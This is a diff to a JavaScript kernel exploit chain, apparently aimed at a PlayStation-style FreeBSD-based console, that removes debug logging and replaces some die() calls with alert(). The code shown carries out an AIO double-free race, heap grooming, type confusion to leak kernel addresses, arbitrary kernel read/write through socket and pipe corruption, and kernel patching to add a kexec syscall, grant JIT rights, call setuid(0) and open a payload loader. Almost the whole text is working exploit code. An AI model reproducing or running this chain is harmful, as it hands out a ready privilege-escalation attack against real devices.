@@ -499,9 +499,9 @@ function make_aliased_rthdrs(sds) {
             get_rthdr(sds[i], buf);
             const marker = buf.read32(marker_offset);
             if (marker !== i) {
-                log(`aliased rthdrs at attempt: ${loop}`);
+                
                 const pair = [sds[i], sds[marker]];
-                log(`found pair: ${pair}`);
+             
                 sds.splice(marker, 1);
                 sds.splice(i, 1);
                 free_rthdrs(sds);
@@ -620,11 +620,10 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     chain.reset();
 
     const main_res = chain.retval_int;
-    log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
 
     if (main_res === -1) {
         call_nze('pthread_join', pthr, 0);
-        log();
+
         return null;
     }
 
@@ -632,18 +631,17 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     try {
         const poll_err = new View4(1);
         aio_multi_poll(request_addr, 1, poll_err.addr);
-        log(`poll: ${hex(poll_err[0])}`);
-
+       
         const info_buf = new View1(size_tcp_info);
         const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
-        log(`info size: ${hex(info_size)}`);
+       
 
         if (info_size !== size_tcp_info) {
             die(`info size isn't ${size_tcp_info}: ${info_size}`);
         }
 
         const tcp_state = info_buf[0];
-        log(`tcp_state: ${tcp_state}`);
+      
 
         const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
         if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH
@@ -655,18 +653,17 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
             won_race = true;
         }
     } finally {
-        log('resume thread\n');
+      
         sysi('thr_resume_ucontext', thr_tid);
         call_nze('pthread_join', pthr, 0);
     }
 
     if (won_race) {
-        log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
+      
         // if the code has no bugs then this isn't possible but we keep the
         // check for easier debugging
         if (sce_errs[0] !== sce_errs[1]) {
-            log('ERROR: bad won_race');
-            die('ERROR: bad won_race');
+            alert('ERROR: bad won_race');
         }
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x80 malloc zone pointers aliased
@@ -746,14 +743,14 @@ function double_free_reqs2(sds) {
         close(sd_conn);
 
         if (res !== null) {
-            log(`won race at attempt: ${i}`);
+          
             close(sd_listen);
             call_nze('pthread_barrier_destroy', barrier.addr);
             return res;
         }
     }
 
-    die('failed aio double free');
+    alert('failed aio double free');
 }
 
 // FUNCTIONS FOR STAGE: LEAK 0x100 MALLOC ZONE ADDRESS
@@ -832,7 +829,7 @@ function leak_kernel_addrs(sd_pair) {
 
     // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
     // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
-    log('confuse evf with rthdr');
+  
     let evf = null;
     for (let i = 0; i < num_alias; i++) {
         const evfs = [];
@@ -859,13 +856,13 @@ function leak_kernel_addrs(sd_pair) {
         }
 
         if (evf !== null) {
-            log(`confused rthdr and evf at attempt: ${i}`);
+     
             break;
         }
     }
 
     if (evf === null) {
-        die('failed to confuse evf and rthdr');
+        alert('failed to confuse evf and rthdr');
     }
 
     set_evf_flags(evf, 0xff << 8);
@@ -880,14 +877,14 @@ function leak_kernel_addrs(sd_pair) {
     // evf.cv.cv_description = "evf cv"
     // string is located at the kernel's mapped ELF file
     const kernel_addr = buf.read64(0x28);
-    log(`"evf cv" string addr: ${kernel_addr}`);
+   
     // because of TAILQ_INIT(), we have:
     //
     // evf.waiters.tqh_last == &evf.waiters.tqh_first
     //
     // we now know the address of the kernel buffer we are leaking
     const kbuf_addr = buf.read64(0x40).sub(0x38);
-    log(`kernel buffer addr: ${kbuf_addr}`);
+  
 
     // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
     // allocate reqs1 arrays at 0x100 malloc zone
@@ -905,7 +902,7 @@ function leak_kernel_addrs(sd_pair) {
     const leak_ids = new View4(leak_ids_len);
     const leak_ids_p = leak_ids.addr;
 
-    log('find aio_entry');
+    
     let reqs2_off = null;
     loop: for (let i = 0; i < num_leaks; i++) {
         get_rthdr(sd, buf);
@@ -923,7 +920,7 @@ function leak_kernel_addrs(sd_pair) {
         for (let off = 0x80; off < buf.length; off += 0x80) {
             if (verify_reqs2(buf, off)) {
                 reqs2_off = off;
-                log(`found reqs2 at attempt: ${i}`);
+              
                 break loop;
             }
         }
@@ -931,21 +928,21 @@ function leak_kernel_addrs(sd_pair) {
         free_aios(leak_ids_p, leak_ids_len);
     }
     if (reqs2_off === null) {
-        die('could not leak a reqs2');
+        alert('could not leak a reqs2');
     }
-    log(`reqs2 offset: ${hex(reqs2_off)}`);
+   
 
     get_rthdr(sd, buf);
     const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
-    log('leaked aio_entry:');
+  
     hexdump(reqs2);
 
     const reqs1_addr = new Long(reqs2.read64(0x10));
-    log(`reqs1_addr: ${reqs1_addr}`);
+    
     reqs1_addr.lo &= -0x100;
-    log(`reqs1_addr: ${reqs1_addr}`);
+  
 
-    log('searching target_id');
+   
     let target_id = null;
     let to_cancel_p = null;
     let to_cancel_len = null;
@@ -955,14 +952,13 @@ function leak_kernel_addrs(sd_pair) {
         get_rthdr(sd, buf);
         const state = buf.read32(reqs2_off + 0x38);
         if (state === AIO_STATE_ABORTED) {
-            log(`found target_id at batch: ${i / num_elems}`);
 
             target_id = new Word(leak_ids[i]);
             leak_ids[i] = 0;
-            log(`target_id: ${hex(target_id)}`);
+        
 
             const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
-            log('leaked aio_entry:');
+           
             hexdump(reqs2);
 
             const start = i + num_elems;
@@ -998,9 +994,9 @@ function make_aliased_pktopts(sds) {
             gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
             const marker = tclass[0];
             if (marker !== i) {
-                log(`aliased pktopts at attempt: ${loop}`);
+               
                 const pair = [sds[i], sds[marker]];
-                log(`found pair: ${pair}`);
+             
                 sds.splice(marker, 1);
                 sds.splice(i, 1);
                 // add pktopts to the new sockets now while new allocs can't
@@ -1034,14 +1030,14 @@ function double_free_reqs1(
     const aio_ids = new View4(aio_ids_len);
     const aio_ids_p = aio_ids.addr;
 
-    log('start overwrite rthdr with AIO queue entry loop');
+  
     let aio_not_found = true;
     free_evf(evf);
     for (let i = 0; i < num_clobbers; i++) {
         spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
 
         if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
-            log(`aliased at attempt: ${i}`);
+        
             aio_not_found = false;
             cancel_aios(aio_ids_p, aio_ids_len);
             break;
@@ -1091,7 +1087,7 @@ function double_free_reqs1(
         addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
     }
 
-    log('start overwrite AIO queue entry with rthdr loop');
+  
     let req_id = null;
     close(sd);
     sd = null;
@@ -1106,20 +1102,16 @@ function double_free_reqs1(
 
             const req_idx = states.indexOf(AIO_STATE_COMPLETE);
             if (req_idx !== -1) {
-                log(`req_idx: ${req_idx}`);
-                log(`found req_id at batch: ${batch}`);
-                log(`states: ${[...states].map(e => hex(e))}`);
-                log(`states[${req_idx}]: ${hex(states[req_idx])}`);
-                log(`aliased at attempt: ${i}`);
+                
 
                 const aio_idx = batch*num_elems + req_idx;
                 req_id = new Word(aio_ids[aio_idx]);
-                log(`req_id: ${hex(req_id)}`);
+              
                 aio_ids[aio_idx] = 0;
 
                 // set .ar3_done to 1
                 poll_aio(req_id, states);
-                log(`states[${req_idx}]: ${hex(states[0])}`);
+          
                 for (let i = 0; i < num_sds; i++) {
                     const sd2 = sds[i];
                     get_rthdr(sd2, reqs2);
@@ -1134,9 +1126,9 @@ function double_free_reqs1(
                     }
                 }
                 if (sd === null) {
-                    die("can't find sd that overwrote AIO queue entry");
+                    alert("can't find sd that overwrote AIO queue entry");
                 }
-                log(`sd: ${sd}`);
+            
 
                 break loop;
             }
@@ -1149,7 +1141,7 @@ function double_free_reqs1(
 
     // enable deletion of target_id
     poll_aio(target_id, states);
-    log(`target's state: ${hex(states[0])}`);
+  
 
     const sce_errs = new View4([-1, -1]);
     const target_ids = new View4([req_id, target_id]);
@@ -1165,26 +1157,26 @@ function double_free_reqs1(
         const sd_pair = make_aliased_pktopts(sds);
         return [sd_pair, sd];
     } finally {
-        log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
+      
 
         states[0] = -1;
         states[1] = -1;
         poll_aio(target_ids, states);
-        log(`target states: ${hex(states[0])}, ${hex(states[1])}`);
+ 
 
         const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
         let success = true;
         if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
-            log('ERROR: bad delete of corrupt AIO request');
+            
             success = false;
         }
         if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
-            log('ERROR: bad delete of ID pair');
+          
             success = false;
         }
 
         if (!success) {
-            die('ERROR: double free on a 0x100 malloc zone failed');
+            alert('ERROR: double free on a 0x100 malloc zone failed');
         }
     }
 }
@@ -1205,7 +1197,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
     pktopts.write64(0x10, pktinfo_p);
 
-    log('overwrite main pktopts');
     let reclaim_sd = null;
     close(pktopts_sds[1]);
     for (let i = 0; i < num_alias; i++) {
@@ -1220,7 +1211,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
         const marker = tclass[0];
         if ((marker & 0xffff) === 0x4141) {
-            log(`found reclaim sd at attempt: ${i}`);
+          
             const idx = marker >>> 16;
             reclaim_sd = sds[idx];
             sds.splice(idx, 1);
@@ -1228,7 +1219,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         }
     }
     if (reclaim_sd === null) {
-        die('failed to overwrite main pktopts');
+        alert('failed to overwrite main pktopts');
     }
 
     const pktinfo = new Buffer(0x14);
@@ -1263,9 +1254,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         return read_buf.read64(0);
     }
 
-    log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
     const kstr = jstr(read_buf);
-    log(`*(&"evf cv"): ${kstr}`);
+ 
     if (kstr !== 'evf cv') {
         die('test read of &"evf cv" failed');
     }
@@ -1274,49 +1264,43 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     const off_kstr = 0x7f6f27;
     const kbase = kernel_addr.sub(off_kstr);
-    log(`kernel base: ${kbase}`);
 
-    log('\nmaking arbitrary kernel read/write');
+
+  
     const cpuid = 7 - main_core;
     const off_cpuid_to_pcpu = 0x21ef2a0;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
-    log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
+
     const pcpu = kread64(pcpu_p);
-    log(`pcpu: ${pcpu}`);
-    log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
+  
     // __pcpu[cpuid].pc_curthread
     const td = kread64(pcpu);
-    log(`td: ${td}`);
+
 
     const off_td_proc = 8;
     const proc = kread64(td.add(off_td_proc));
-    log(`proc: ${proc}`);
+   
     const pid = sysi('getpid');
-    log(`our pid: ${pid}`);
+   
     const pid2 = kread64(proc.add(0xb0)).lo;
-    log(`suspected proc pid: ${pid2}`);
+  
     if (pid2 !== pid) {
-        die('process not found');
+        alert('process not found');
     }
 
     const off_p_fd = 0x48;
     const p_fd = kread64(proc.add(off_p_fd));
-    log(`proc.p_fd: ${p_fd}`);
     // curthread->td_proc->p_fd->fd_ofiles
     const ofiles = kread64(p_fd);
-    log(`ofiles: ${ofiles}`);
 
     const off_p_ucred = 0x40;
     const p_ucred = kread64(proc.add(off_p_ucred));
-    log(`p_ucred ${p_ucred}`);
 
     const pipes = new View4(2);
     sysi('pipe', pipes.addr);
     const pipe_file = kread64(ofiles.add(pipes[0] * 8));
-    log(`pipe file: ${pipe_file}`);
     // ofiles[pipe_fd].f_data
     const kpipe = kread64(pipe_file);
-    log(`pipe pointer: ${kpipe}`);
 
     const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
     for (let off = 0; off < pipe_save.size; off += 8) {
@@ -1327,17 +1311,16 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const worker_sd = dirty_sd;
 
     const main_file = kread64(ofiles.add(main_sd * 8));
-    log(`main sock file: ${main_file}`);
+    
     // ofiles[sd].f_data
     const main_sock = kread64(main_file);
-    log(`main sock pointer: ${main_sock}`);
+
     // socket.so_pcb (struct inpcb *)
     const m_pcb = kread64(main_sock.add(0x18));
-    log(`main sock pcb: ${m_pcb}`);
+  
     // inpcb.in6p_outputopts
     const m_pktopts = kread64(m_pcb.add(0x118));
-    log(`main pktopts: ${m_pktopts}`);
-    log(`0x100 malloc zone pointer: ${k100_addr}`);
+ 
 
     if (m_pktopts.ne(k100_addr)) {
         die('main pktopts pointer != leaked pktopts pointer');
@@ -1345,23 +1328,21 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     // ofiles[sd].f_data
     const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
-    log(`reclaim sock pointer: ${reclaim_sock}`);
     // socket.so_pcb (struct inpcb *)
     const r_pcb = kread64(reclaim_sock.add(0x18));
-    log(`reclaim sock pcb: ${r_pcb}`);
+    
     // inpcb.in6p_outputopts
     const r_pktopts = kread64(r_pcb.add(0x118));
-    log(`reclaim pktopts: ${r_pktopts}`);
 
     // ofiles[sd].f_data
     const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
-    log(`worker sock pointer: ${worker_sock}`);
+   
     // socket.so_pcb (struct inpcb *)
     const w_pcb = kread64(worker_sock.add(0x18));
-    log(`worker sock pcb: ${w_pcb}`);
+   
     // inpcb.in6p_outputopts
     const w_pktopts = kread64(w_pcb.add(0x118));
-    log(`worker pktopts: ${w_pktopts}`);
+   
 
     // get restricted read/write with pktopts pair
     // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
@@ -1374,12 +1355,10 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
     gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
     const kstr2 = jstr(pktinfo);
-    log(`*(&"evf cv"): ${kstr2}`);
+   
     if (kstr2 !== 'evf cv') {
-        die('pktopts read failed');
+        alert('pktopts read failed');
     }
-    log('achieved restricted kernel read/write');
-
     // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
     // using pktopts write. we can safely modify a pipe even with this limit so
     // we corrupt that instead for arbitrary read/write. pipe.pipe_map will be
@@ -1481,11 +1460,11 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const kstr3_buf = new Buffer(8);
     kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
     const kstr3 = jstr(kstr3_buf);
-    log(`*(&"evf cv"): ${kstr3}`);
+ 
     if (kstr3 !== 'evf cv') {
         die('pipe read failed');
     }
-    log('achieved arbitrary kernel read/write');
+   
 
     // RESTORE: clean corrupt pointer
      // pktopts.ip6po_rthdr = NULL
@@ -1495,8 +1474,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
      kmem.write64(r_rthdr_p, 0);
      kmem.write64(w_rthdr_p, 0);
-     log('corrupt pointers cleaned');
-
+ 
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
@@ -1529,7 +1507,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         throw RangeError('kernel patching unsupported');
     }
 
-    log('change sys_aio_submit() to sys_kexec()');
+ 
     // sysent[661] is unimplemented so free for use
     const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
@@ -1543,7 +1521,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
-    log('add JIT capabilities');
+  
     // TODO just set the bits for JIT privs
     // cr_sceCaps[0]
     kmem.write64(p_ucred.add(0x60), -1);
@@ -1591,41 +1569,38 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         0,
     );
 
-    log(`exec_addr: ${exec_addr}`);
-    log(`write_addr: ${write_addr}`);
+   
     if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
         die('mmap() for jit failed');
     }
 
-    log('mlock exec_addr for kernel exec');
+  
     sysi('mlock', exec_addr, map_size);
 
     // mov eax, 0x1337; ret (0xc300_0013_37b8)
     const test_code = new Int(0x001337b8, 0xc300);
     write_addr.write64(0, test_code);
 
-    log('test jit exec');
+;
     sys_void('kexec', exec_addr);
     let retval = chain.errno;
-    log('returned successfully');
-
-    log(`jit retval: ${retval}`);
+  
+ 
     if (retval !== 0x1337) {
-        die('test jit exec failed');
+        alert('test jit exec failed');
     }
 
     const pipe_save = restore_info[1];
     restore_info[1] = pipe_save.addr;
-    log('mlock pipe save data for kernel restore');
+ 
     sysi('mlock', restore_info[1], page_size);
 
     mem.cpy(write_addr, patches.addr, patches.size);
     sys_void('kexec', exec_addr, ...restore_info);
 
-    log('setuid(0)');
+   
     sysi('setuid', 0);
-    log('kernel exploit succeeded!');
-    log('restore sys_aio_submit()');
+  
     kmem.write32(sysent_661, sy_narg);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
     kmem.write64(sysent_661.add(8), sy_call);
@@ -1643,7 +1618,6 @@ function setup(block_fd) {
     // we may cancel them instead. this is to work around the fact that
     // aio_worker_entry2() will fdrop() the file associated with the aio_entry
     // on ps5. we want aio_multi_delete() to call fdrop()
-    log('block AIO');
     const reqs1 = new Buffer(0x28 * num_workers);
     const block_id = new Word();
 
@@ -1653,7 +1627,7 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-    log('heap grooming');
+    
     // chosen to maximize the number of 0x80 malloc allocs per submission
     const num_reqs = 3;
     const groom_ids = new View4(num_grooms);
@@ -1704,8 +1678,7 @@ function runBinLoader() {
         payload_buffer
     );
 
-    log('BinLoader is ready. Send a payload to port 9020 now');
-}
+ }
 
 // overview:
 // * double free a aio_entry (resides at a 0x80 malloc zone)
@@ -1746,16 +1719,14 @@ export async function kexploit() {
     // use all the cores
     const main_mask = new Long();
     get_our_affinity(main_mask);
-    log(`main_mask: ${main_mask}`);
+ 
 
     // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
     // spraying and grooming easier
-    log(`pinning process to core #${main_core}`);
+ 
     set_our_affinity(new Long(1 << main_core));
     get_our_affinity(main_mask);
-    log(`main_mask: ${main_mask}`);
-
-    log("setting main thread's priority");
+ 
     sysi('rtprio_thread', RTP_SET, 0, rtprio.addr);
 
     const [block_fd, unblock_fd] = (() => {
@@ -1772,27 +1743,26 @@ export async function kexploit() {
     let block_id = null;
     let groom_ids = null;
     try {
-        log('STAGE: Setup');
+      
         [block_id, groom_ids] = setup(block_fd);
 
-        log('\nSTAGE: Double free AIO queue entry');
+      
         const sd_pair = double_free_reqs2(sds);
 
-        log('\nSTAGE: Leak kernel addresses');
+      
         const [
             reqs1_addr, kbuf_addr, kernel_addr, target_id, evf,
         ] = leak_kernel_addrs(sd_pair);
 
-        log('\nSTAGE: Double free SceKernelAioRWRequest');
         const [pktopts_sds, dirty_sd] = double_free_reqs1(
             reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds,
         );
 
-        log('\nSTAGE: Get arbitrary kernel read/write');
+      
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-        log('\nSTAGE: Patch kernel');
+        
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
         
     } finally {
@@ -1801,11 +1771,7 @@ export async function kexploit() {
         const t2 = performance.now();
         const ftime = t2 - t1;
         const init_time = _init_t2 - _init_t1;
-        log('\ntime (include init): ' + (ftime) / 1000);
-        log('kex time: ' + (t2 - _init_t2) / 1000);
-        log('init time: ' + (init_time) / 1000);
-        log('time to init: ' + (_init_t1 - t1) / 1000);
-        log('time - init time: ' + (ftime - init_time) / 1000);
+      
     }
     close(block_fd);
     free_aios2(groom_ids.addr, groom_ids.length);
